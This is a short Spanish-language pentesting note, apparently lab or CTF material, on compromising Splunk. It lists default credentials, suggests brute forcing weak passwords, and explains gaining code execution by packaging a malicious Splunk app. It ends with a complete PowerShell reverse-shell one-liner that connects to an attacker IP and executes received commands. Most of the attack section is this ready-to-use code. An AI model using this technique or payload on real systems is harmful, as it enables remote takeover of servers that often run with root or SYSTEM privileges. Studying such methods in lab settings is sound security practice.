- Herramienta de recopilación, analisis y visualización de datos.
- Suele correr como root o SYSTEM.
- Corre por defecto en el puerto 8000
- La version free no requiere autenticación.
-  Default credentials: admin:changeme.
-  SI las credenciales anteriores no funcionan, siempre sirve hacer fuerza bruta con weak passwords.
-  Viene con python instalado.


### Enumeration

    https://10.129.201.50:8000/en-US/app/launcher/home

### Exploitation

Podemos tener RCE si creamos una aplicación en python, batch o Powershell.

##### 1) Creamos una aplicación con la estructura de directorios:

        splunk_shell/
        ├── bin
        └── default

##### 2) En la carpeta bin metemos los scripts que vamos a correr y en el directorio default tenemos que poner los inputs.conf

Script de shell reversa en powershell:

        #A simple and small reverse shell. Options and help removed to save space. 
        #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
        $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()



